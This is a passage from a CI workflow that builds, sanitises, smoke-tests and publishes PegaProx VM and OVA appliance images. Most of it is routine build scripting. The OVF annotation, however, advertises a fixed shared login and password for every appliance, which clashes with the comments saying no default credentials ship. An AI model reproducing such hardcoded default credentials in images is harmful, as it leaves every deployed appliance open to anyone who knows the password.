          for arg in "$@"; do case $arg in
            --ip=*) IP="${arg#*=}";;
            --cidr=*|--subnet=*|--mask=*) CIDR="${arg#*=}";;
            --gateway=*|--gw=*) GW="${arg#*=}";;
            --dns=*) DNS="${arg#*=}";;
            --domain=*|--search=*) DOMAINS="${arg#*=}";;
            --interface=*|--iface=*) IFACE="${arg#*=}";;
            --port=*) PORT="${arg#*=}";;
            --dhcp) DHCP=true;;
            --force|-f) FORCE=true;;
            --help|-h) echo "Usage: pegaprox-setup-auto --ip=X --cidr=24 --gateway=X [--dns='..'] [--domain=example.lan] [--port=443] | --dhcp [--domain=..] [--force]"; exit 0;;
          esac; done

          [ "$EUID" -ne 0 ] && { log "ERROR: root required"; exit 1; }
          mkdir -p /etc/pegaprox
          if [ -f "$MARKER" ] && [ "$FORCE" != "true" ]; then log "Already configured"; exit 0; fi
          [ "$FORCE" = "true" ] && rm -f "$MARKER" || true

          [ -z "$IFACE" ] && IFACE=$(ip -o link show | awk -F': ' '{print $2}' | grep -v '^lo$' | head -n1) || true
          IFACE="${IFACE%%@*}"; IFACE="${IFACE:-eth0}"
          [[ ! $CIDR =~ ^[0-9]+$ ]] && CIDR=$(mask_to_cidr "$CIDR") || true
          [ -z "$CIDR" ] && CIDR=24 || true

          if [ "$DHCP" != "true" ]; then
            [ -z "$IP" ] && { log "ERROR: --ip required"; exit 1; }
            [ -z "$GW" ] && { log "ERROR: --gateway required"; exit 1; }
          fi
          # a short host name only resolves with a search domain on the link (see pegaprox-setup)
          for d in $DOMAINS; do
            [[ $d =~ ^[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$ ]] \
              || { log "ERROR: invalid search domain: $d"; exit 1; }
          done

          log "Interface: $IFACE"
          mkdir -p /etc/cloud/cloud.cfg.d
          echo 'network: {config: disabled}' > /etc/cloud/cloud.cfg.d/99-disable-network-config.cfg
          mkdir -p /etc/systemd/network
          rm -f /etc/systemd/network/*.network 2>/dev/null || true

          # systemd-resolved takes DNS= and Domains= from this file, /etc/resolv.conf is its stub
          if [ "$DHCP" = "true" ]; then
            { printf '[Match]\nName=%s\n\n[Network]\nDHCP=yes\n' "$IFACE"
              if [ -n "$DOMAINS" ]; then printf 'Domains=%s\n' "$DOMAINS"; fi
            } > /etc/systemd/network/10-pegaprox.network
            log "DHCP configured on $IFACE"
          else
            { printf '[Match]\nName=%s\n\n[Network]\nAddress=%s/%s\nGateway=%s\n' "$IFACE" "$IP" "$CIDR" "$GW"
              for d in $DNS; do printf 'DNS=%s\n' "$d"; done
              if [ -n "$DOMAINS" ]; then printf 'Domains=%s\n' "$DOMAINS"; fi
            } > /etc/systemd/network/10-pegaprox.network
            log "Static: $IP/$CIDR gw $GW"
          fi
          if [ -n "$DOMAINS" ]; then log "Search domain: $DOMAINS"; fi
          systemctl disable networking 2>/dev/null || true
          systemctl enable systemd-networkd 2>/dev/null || true
          systemctl restart systemd-networkd 2>/dev/null || true
          sleep 3

          systemctl daemon-reload
          systemctl enable pegaprox 2>/dev/null || true
          systemctl restart pegaprox 2>/dev/null || systemctl start pegaprox 2>/dev/null || true
          sleep 8

          if [ "$PORT" != 5000 ]; then
            set_port "$PORT" \
              && { systemctl restart pegaprox 2>/dev/null || true; sleep 4; log "Port set to $PORT"; } \
              || log "Could not set port automatically"
          fi

          if systemctl is-active --quiet pegaprox; then
            touch "$MARKER"
            FINAL=$(ip -4 addr show "$IFACE" 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n1 || true)
            [ "$PORT" = 443 ] && log "Done: https://${FINAL:-<ip>}" || log "Done: https://${FINAL:-<ip>}:$PORT"
          else
            log "ERROR: pegaprox failed to start"; exit 1
          fi
          AUTO

          # ==================================================================
          # Autostart des Wizards beim ersten Login - Hinweis: ENGLISCH
          # ==================================================================
          cat > pegaprox-firstboot-profile.sh <<'PROF'
          #!/bin/bash
          if [ ! -f /etc/pegaprox/.setup-complete ] && [ -t 0 ] && [ -z "${PEGAPROX_SKIP_SETUP:-}" ]; then
            echo ""
            echo -e "\033[1;33mPegaProx needs to be configured. The wizard starts in 5s (Ctrl+C to cancel)...\033[0m"
            sleep 5
            if [ "$EUID" -eq 0 ]; then
              /usr/local/bin/pegaprox-setup
            elif command -v sudo >/dev/null 2>&1; then
              sudo /usr/local/bin/pegaprox-setup
            fi
          fi
          PROF

          # ==================================================================
          # qcow2 als NBD-Blockgerät einhängen
          # ==================================================================
          sudo modprobe nbd max_part=16
          sudo qemu-nbd --connect=/dev/nbd0 pegaprox.qcow2
          for i in $(seq 1 10); do
            sudo partprobe /dev/nbd0 2>/dev/null || true
            sleep 1
            ls /dev/nbd0p* >/dev/null 2>&1 && break
          done
          echo "Partitionen:"; lsblk /dev/nbd0

          ROOT=""
          for PART in $(ls /dev/nbd0p* 2>/dev/null); do
            sudo mkdir -p /mnt/probe
            if sudo mount "$PART" /mnt/probe 2>/dev/null; then
              if [ -f /mnt/probe/etc/os-release ]; then
                ROOT="$PART"; sudo umount /mnt/probe; break
              fi
              sudo umount /mnt/probe
            fi
          done
          [ -n "$ROOT" ] || { echo "::error::Root-Partition nicht gefunden"; exit 1; }
          echo "Root-Partition: $ROOT"

          sudo mkdir -p /mnt/img
          sudo mount "$ROOT" /mnt/img

          # --- Dateien hineinkopieren ---
          sudo mkdir -p /mnt/img/etc/apt/keyrings /mnt/img/etc/pegaprox
          sudo cp gyptazy.asc  /mnt/img/etc/apt/keyrings/gyptazy.asc
          sudo cp gyptazy.list /mnt/img/etc/apt/sources.list.d/gyptazy.list

          sudo cp install-pegaprox.sh /mnt/img/usr/local/sbin/install-pegaprox.sh
          sudo install -D -m 0644 "$RUNNER_TEMP/sqlcipher3-deb/python3-sqlcipher3.deb" \
            /mnt/img/var/cache/pegaprox-image/python3-sqlcipher3.deb
          sudo cp pegaprox-setup      /mnt/img/usr/local/bin/pegaprox-setup
          sudo cp pegaprox-setup-auto /mnt/img/usr/local/bin/pegaprox-setup-auto
          sudo chmod 0755 /mnt/img/usr/local/sbin/install-pegaprox.sh \
                          /mnt/img/usr/local/bin/pegaprox-setup \
                          /mnt/img/usr/local/bin/pegaprox-setup-auto

          sudo cp pegaprox-firstboot-profile.sh \
            /mnt/img/etc/profile.d/pegaprox-firstboot.sh
          sudo chmod 0755 /mnt/img/etc/profile.d/pegaprox-firstboot.sh

          sudo cp pegaprox-firstboot.service \
            /mnt/img/etc/systemd/system/pegaprox-firstboot.service

          # --- Services aktivieren (Symlinks, kein chroot nötig) ---
          sudo mkdir -p /mnt/img/etc/systemd/system/multi-user.target.wants
          sudo ln -sf /etc/systemd/system/pegaprox-firstboot.service \
            /mnt/img/etc/systemd/system/multi-user.target.wants/pegaprox-firstboot.service

          for U in ssh.service sshd.service; do
            if [ -f "/mnt/img/lib/systemd/system/$U" ] || [ -f "/mnt/img/usr/lib/systemd/system/$U" ]; then
              SRC="/lib/systemd/system/$U"
              [ -f "/mnt/img/usr/lib/systemd/system/$U" ] && SRC="/usr/lib/systemd/system/$U"
              sudo ln -sf "$SRC" \
                "/mnt/img/etc/systemd/system/multi-user.target.wants/$U"
              break
            fi
          done

          sudo sync
          sudo umount /mnt/img
          sudo qemu-nbd --disconnect /dev/nbd0
          echo "Image-Bearbeitung abgeschlossen."

      - name: Smoke-Test (VM booten + First-Boot-Install + HTTP-Check)
        run: |
          set -e
          # NS Oct 2026 (#1129) - this boot runs on the image we ship, so everything it
          # leaves behind goes out to every user. The seed used to set a password for the
          # cloud-init default user: every appliance had debian/pegaprox with passwordless
          # sudo and SSH password logins on. No default user, no password, from now on.
          cat > user-data <<'EOF'
          #cloud-config
          users: []
          EOF
          echo "instance-id: iid-pegaprox" > meta-data
          cloud-localds seed.iso user-data meta-data

          if [ "${{ matrix.arch }}" = "amd64" ]; then
            qemu-system-x86_64 \
              -m 2048 -smp 2 \
              -drive file=pegaprox.qcow2,format=qcow2,if=virtio \
              -drive file=seed.iso,format=raw,if=virtio \
              -netdev user,id=n0,hostfwd=tcp::${PVE_PORT}-:${PVE_PORT} \
              -device virtio-net-pci,netdev=n0 \
              -monitor unix:qemu-mon.sock,server,nowait \
              -display none -daemonize -pidfile qemu.pid
          else
            qemu-system-aarch64 \
              -machine virt -cpu cortex-a72 -m 2048 -smp 2 \
              -bios /usr/share/AAVMF/AAVMF_CODE.fd \
              -drive file=pegaprox.qcow2,format=qcow2,if=virtio \
              -drive file=seed.iso,format=raw,if=virtio \
              -netdev user,id=n0,hostfwd=tcp::${PVE_PORT}-:${PVE_PORT} \
              -device virtio-net-device,netdev=n0 \
              -monitor unix:qemu-mon.sock,server,nowait \
              -display none -daemonize -pidfile qemu.pid
          fi

          echo "Warte auf PegaProx in der VM (First-Boot-Install, max. 8 min)..."
          OK=0
          for i in $(seq 1 150); do
            if curl -kfs "https://localhost:${PVE_PORT}/" >/dev/null 2>&1 \
               || curl -fs "http://localhost:${PVE_PORT}/" >/dev/null 2>&1; then
              OK=1; break
            fi
            sleep 10
          done

          # Shut the guest down, do not kill it. A kill right after the first start left
          # the freshly generated TLS pair at 0 bytes in the image (#1129).
          QPID="$(cat qemu.pid)"
          python3 -c "import socket; s=socket.socket(socket.AF_UNIX); s.connect('qemu-mon.sock'); s.sendall(b'system_powerdown\n')" || true
          for i in $(seq 1 60); do kill -0 "$QPID" 2>/dev/null || break; sleep 5; done
          if kill -0 "$QPID" 2>/dev/null; then
            kill "$QPID" 2>/dev/null || true
            echo "::error::Die VM hat sich nicht sauber heruntergefahren - das Image wird so nicht ausgeliefert"
            exit 1
          fi
          [ "$OK" -eq 1 ] || { echo "::error::PegaProx kam in der VM nicht hoch"; exit 1; }
          echo "VM Smoke-Test erfolgreich."

      - name: Zustand des Testboots aus dem Image entfernen
        run: |
          set -e
          # NS Oct 2026 (#1129) - the smoke boot installed PegaProx and that stays, but
          # nothing that belongs to one machine may ship: PegaProx's database, its
          # encryption keys and TLS pair, SSH host keys, the machine id and cloud-init's
          # record of the test instance were all identical on every appliance.
          sudo qemu-nbd --connect=/dev/nbd0 pegaprox.qcow2
          for i in $(seq 1 10); do
            sudo partprobe /dev/nbd0 2>/dev/null || true
            sleep 1
            ls /dev/nbd0p* >/dev/null 2>&1 && break
          done
          ROOT=""
          for PART in $(ls /dev/nbd0p* 2>/dev/null); do
            sudo mkdir -p /mnt/probe
            if sudo mount "$PART" /mnt/probe 2>/dev/null; then
              if [ -f /mnt/probe/etc/os-release ]; then ROOT="$PART"; sudo umount /mnt/probe; break; fi
              sudo umount /mnt/probe
            fi
          done
          [ -n "$ROOT" ] || { echo "::error::Root-Partition nicht gefunden"; exit 1; }
          sudo mkdir -p /mnt/img
          sudo mount "$ROOT" /mnt/img
          # NS Nov 2026 (#1226) - what PegaProx said about its database in the smoke boot,
          # checked below once the image is clean
          sudo cat /mnt/img/var/cache/pegaprox-image/keystore-status.json > "$RUNNER_TEMP/keystore-status.json" || true
          R=/mnt/img

          # PegaProx state: a fresh database, keys and TLS pair on the user's first start
          sudo find "$R/var/lib/pegaprox" -mindepth 1 -delete
          # NS Nov 2026 (#1226) - and the master key the package put in /etc/pegaprox during
          # this boot: the unit makes each appliance its own before its first start
          sudo sh -c "rm -f $R/etc/pegaprox/secret.key $R/etc/pegaprox/secret.key.new.*"
          # the installer ran in the smoke boot; it must not run again on the user's machine
          sudo rm -f "$R/usr/local/sbin/install-pegaprox.sh" \
                     "$R/etc/systemd/system/pegaprox-firstboot.service" \
                     "$R/etc/systemd/system/multi-user.target.wants/pegaprox-firstboot.service"
          # and what it had from the build: the python3-sqlcipher3 deb, the status of PegaProx
          sudo rm -rf "$R/var/cache/pegaprox-image"
          # SSH host keys: generated on first boot instead (cloud-init does not run there)
          sudo rm -f "$R"/etc/ssh/ssh_host_*
          sudo tee "$R/etc/systemd/system/pegaprox-ssh-hostkeys.service" >/dev/null <<'UNIT'
          [Unit]
          Description=Generate SSH host keys on first boot (PegaProx appliance)
          Before=ssh.service
          ConditionPathExists=!/etc/ssh/ssh_host_ed25519_key

          [Service]
          Type=oneshot
          ExecStart=/usr/bin/ssh-keygen -A

          [Install]
          WantedBy=multi-user.target
          UNIT
          sudo sed -i 's/^[[:space:]]*//' "$R/etc/systemd/system/pegaprox-ssh-hostkeys.service"
          sudo ln -sf /etc/systemd/system/pegaprox-ssh-hostkeys.service \
            "$R/etc/systemd/system/multi-user.target.wants/pegaprox-ssh-hostkeys.service"
          # machine id, cloud-init record and the journal of the test boot
          sudo truncate -s 0 "$R/etc/machine-id"
          [ -L "$R/var/lib/dbus/machine-id" ] || sudo rm -f "$R/var/lib/dbus/machine-id"
          sudo sh -c "rm -rf $R/var/lib/cloud/* $R/var/log/cloud-init*.log"
          # MK Nov 2026 - cloud-init wrote a netplan file for the smoke boot's NIC (ens3 with
          # QEMU's default MAC). It matches no user's NIC, and on one with that MAC it would
          # sort ahead of the wizard's 10-pegaprox.network
          sudo rm -f "$R/etc/netplan/50-cloud-init.yaml"
          sudo find "$R/var/log/journal" -mindepth 1 -delete 2>/dev/null || true

          # refuse to ship if any of it is back
          FAIL=0
          if grep -q '^debian:' "$R/etc/passwd"; then echo "::error::cloud-init default user is in the image"; FAIL=1; fi
          if [ -n "$(sudo ls -A "$R/var/lib/pegaprox")" ]; then echo "::error::/var/lib/pegaprox is not empty"; FAIL=1; fi
          if sudo sh -c "ls $R/etc/pegaprox/secret.key*" >/dev/null 2>&1; then echo "::error::the master key of the smoke boot is in the image"; FAIL=1; fi
          if ls "$R"/etc/ssh/ssh_host_* >/dev/null 2>&1; then echo "::error::SSH host keys are in the image"; FAIL=1; fi
          if [ -s "$R/etc/machine-id" ]; then echo "::error::machine-id is set"; FAIL=1; fi
          if [ -e "$R/etc/netplan/50-cloud-init.yaml" ]; then echo "::error::the smoke boot's netplan file is in the image"; FAIL=1; fi

          sudo sync
          sudo umount /mnt/img
          sudo qemu-nbd --disconnect /dev/nbd0
          # port 5000 answered on plain SQLite too. On arm64 this fails the leg before its image
          # is uploaded (continue-on-error: the amd64 release goes out without it)
          echo "----- --keystore-status of the smoke boot -----"
          cat "$RUNNER_TEMP/keystore-status.json" || true
          python3 -I packaging/apt/smoke_backend.py "$RUNNER_TEMP/keystore-status.json" || FAIL=1
          [ "$FAIL" -eq 0 ] || exit 1
          echo "Image bereinigt."

      - name: Image komprimieren + umbenennen
        run: |
          qemu-img convert -O qcow2 -c pegaprox.qcow2 \
            "pegaprox-${{ needs.prepare.outputs.version }}-vm-${{ matrix.arch }}.qcow2"
          cp "pegaprox-${{ needs.prepare.outputs.version }}-vm-${{ matrix.arch }}.qcow2" \
             "pegaprox-vm-${{ matrix.arch }}.qcow2"

      - name: OVA für ESXi erstellen
        run: |
          set -e
          VERSION="${{ needs.prepare.outputs.version }}"
          ARCH="${{ matrix.arch }}"
          BASE="pegaprox-${VERSION}-vm-${ARCH}"

          # Convert qcow2 → streamOptimized VMDK (required format for OVA packaging)
          qemu-img convert -O vmdk -o subformat=streamOptimized \
            "${BASE}.qcow2" "${BASE}.vmdk"

          DISK_BYTES=$(qemu-img info --output=json "${BASE}.qcow2" \
            | python3 -c "import sys,json; print(json.load(sys.stdin)['virtual-size'])")
          VMDK_BYTES=$(stat -c%s "${BASE}.vmdk")

          if [ "$ARCH" = "amd64" ]; then
            OS_ID="96"
            OS_TYPE="debian12_64Guest"
            OS_DESC="Debian GNU/Linux 12 (64-bit)"
          else
            OS_ID="96"
            OS_TYPE="arm64Guest"
            OS_DESC="Debian GNU/Linux 12 (ARM 64-bit)"
          fi

          cat > "${BASE}.ovf" <<OVF
          <?xml version="1.0" encoding="UTF-8"?>
          <Envelope xmlns="http://schemas.dmtf.org/ovf/envelope/1"
                    xmlns:cim="http://schemas.dmtf.org/wbem/wscim/1/common"
                    xmlns:ovf="http://schemas.dmtf.org/ovf/envelope/1"
                    xmlns:rasd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_ResourceAllocationSettingData"
                    xmlns:vmw="http://www.vmware.com/schema/ovf"
                    xmlns:vssd="http://schemas.dmtf.org/wbem/wscim/1/cim-schema/2/CIM_VirtualSystemSettingData"
                    xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
            <References>
              <File ovf:href="${BASE}.vmdk" ovf:id="file1" ovf:size="${VMDK_BYTES}"/>
            </References>
            <DiskSection>
              <Info>Virtual disk information</Info>
              <Disk ovf:capacity="${DISK_BYTES}" ovf:capacityAllocationUnits="byte"
                    ovf:diskId="vmdisk1" ovf:fileRef="file1"
                    ovf:format="http://www.vmware.com/interfaces/specifications/vmdk.html#streamOptimized"
                    ovf:populatedSize="${VMDK_BYTES}"/>
            </DiskSection>
            <NetworkSection>
              <Info>The list of logical networks</Info>
              <Network ovf:name="VM Network">
                <Description>VM Network</Description>
              </Network>
            </NetworkSection>
            <VirtualSystem ovf:id="PegaProx">
              <Info>PegaProx ${VERSION} (${ARCH})</Info>
              <Name>PegaProx ${VERSION}</Name>
              <OperatingSystemSection ovf:id="${OS_ID}" vmw:osType="${OS_TYPE}">
                <Info>Guest Operating System</Info>
                <Description>${OS_DESC}</Description>
              </OperatingSystemSection>
              <VirtualHardwareSection>
                <Info>Virtual hardware requirements</Info>
                <System>
                  <vssd:ElementName>Virtual Hardware Family</vssd:ElementName>
                  <vssd:InstanceID>0</vssd:InstanceID>
                  <vssd:VirtualSystemIdentifier>PegaProx</vssd:VirtualSystemIdentifier>
                  <vssd:VirtualSystemType>vmx-14</vssd:VirtualSystemType>
                </System>
                <Item>
                  <rasd:Description>Number of virtual CPUs</rasd:Description>
                  <rasd:ElementName>4 virtual CPU(s)</rasd:ElementName>
                  <rasd:InstanceID>1</rasd:InstanceID>
                  <rasd:ResourceType>3</rasd:ResourceType>
                  <rasd:VirtualQuantity>4</rasd:VirtualQuantity>
                </Item>
                <Item>
                  <rasd:AllocationUnits>byte * 2^20</rasd:AllocationUnits>
                  <rasd:Description>Memory size</rasd:Description>
                  <rasd:ElementName>8192 MB of memory</rasd:ElementName>
                  <rasd:InstanceID>2</rasd:InstanceID>
                  <rasd:ResourceType>4</rasd:ResourceType>
                  <rasd:VirtualQuantity>8192</rasd:VirtualQuantity>
                </Item>
                <Item>
                  <rasd:Address>0</rasd:Address>
                  <rasd:Description>SCSI Controller</rasd:Description>
                  <rasd:ElementName>SCSI Controller 0</rasd:ElementName>
                  <rasd:InstanceID>3</rasd:InstanceID>
                  <rasd:ResourceSubType>VirtualSCSI</rasd:ResourceSubType>
                  <rasd:ResourceType>6</rasd:ResourceType>
                </Item>
                <Item>
                  <rasd:AddressOnParent>0</rasd:AddressOnParent>
                  <rasd:ElementName>Hard Disk 1</rasd:ElementName>
                  <rasd:HostResource>ovf:/disk/vmdisk1</rasd:HostResource>
                  <rasd:InstanceID>4</rasd:InstanceID>
                  <rasd:Parent>3</rasd:Parent>
                  <rasd:ResourceType>17</rasd:ResourceType>
                </Item>
                <Item>
                  <rasd:AddressOnParent>0</rasd:AddressOnParent>
                  <rasd:AutomaticAllocation>true</rasd:AutomaticAllocation>
                  <rasd:Connection>VM Network</rasd:Connection>
                  <rasd:Description>VMXNET3 ethernet adapter</rasd:Description>
                  <rasd:ElementName>Network adapter 1</rasd:ElementName>
                  <rasd:InstanceID>5</rasd:InstanceID>
                  <rasd:ResourceSubType>VMXNET3</rasd:ResourceSubType>
                  <rasd:ResourceType>10</rasd:ResourceType>
                </Item>
              </VirtualHardwareSection>
              <AnnotationSection>
                <Info>Annotation</Info>
                <Annotation>PegaProx ${VERSION} appliance for ESXi. Login: pegaprox_admin / PegaProx2026! | Run pegaprox-setup after first boot to configure networking.</Annotation>
              </AnnotationSection>
            </VirtualSystem>
          </Envelope>
          OVF
          sed -i 's/^[[:space:]]*//' "${BASE}.ovf"

          # OVF manifest — SHA256 of OVF and VMDK; required by the OVF spec
          OVF_HASH=$(sha256sum "${BASE}.ovf" | awk '{print $1}')
          VMDK_HASH=$(sha256sum "${BASE}.vmdk" | awk '{print $1}')
          printf 'SHA256(%s)= %s\nSHA256(%s)= %s\n' \
            "${BASE}.ovf" "${OVF_HASH}" \
            "${BASE}.vmdk" "${VMDK_HASH}" \
            > "${BASE}.mf"

          # OVF spec §12: OVF descriptor first, manifest second, disk(s) last
          tar -cf "${BASE}.ova" "${BASE}.ovf" "${BASE}.mf" "${BASE}.vmdk"
          cp "${BASE}.ova" "pegaprox-latest-vm-${ARCH}.ova"

          echo "OVA: $(ls -lh "${BASE}.ova")"

      - name: Artefakt sichern
        uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # v4.6.2
        with:
          name: vm-image-${{ matrix.arch }}
          path: |
            pegaprox-*vm*.qcow2
            pegaprox-*vm*.ova
          retention-days: 7

  # ----------------------------------------------------------------------
  # 4) Alles an den Release anhängen
  # ----------------------------------------------------------------------
  publish:
    needs: [prepare, build-lxc, build-vm]
    # NS Oct 2026 - a dispatch without a tag builds dev-YYYYMMDD-HHMMSS, and this job used
    # to attach that to a release of the same name, creating a public dev release and tag.
    # Dev builds stop at the artifacts.
    if: ${{ always() && needs.prepare.outputs.is_release == 'true' && needs.build-lxc.result == 'success' && needs.build-vm.result == 'success' }}
    runs-on: ubuntu-latest
    # NS Oct 2026 - id-token and attestations only for the provenance step below; this job
    # runs no build, just the download, the checksums and the upload
    permissions:
      contents: write
      id-token: write
      attestations: write
    steps:
      - uses: actions/download-artifact@d3f86a106a0bac45b974a628896c90dbdf5c8093 # v4.3.0
        with:
          path: dist

      - name: Checksums erzeugen
        run: |
          cd dist
          find . -type f \( -name '*.qcow2' -o -name '*.tar.xz' -o -name '*.ova' \) \
            -execdir sha256sum {} \; > SHA256SUMS.txt
          cat SHA256SUMS.txt

      # NS Oct 2026 - signed build provenance for every image file, as for the Docker
      # images. A downloaded file checks with
      #   gh attestation verify <file> -R PegaProx/project-pegaprox
      - name: Herkunft der Images signieren
        uses: actions/attest@1e69f48acb82d1966a394da916b4c1698aa569d6 # v4.2.2
        with:
          subject-path: |
            dist/**/*.qcow2
            dist/**/*.tar.xz

      - name: An Release anhängen
        uses: softprops/action-gh-release@3bb12739c298aeb8a4eeaf626c5b8d85266b0e65 # v2.6.2
        with:
          tag_name: ${{ needs.prepare.outputs.version }}
          files: |
            dist/**/*.qcow2
            dist/**/*.tar.xz
            dist/**/*.ova
            dist/SHA256SUMS.txt
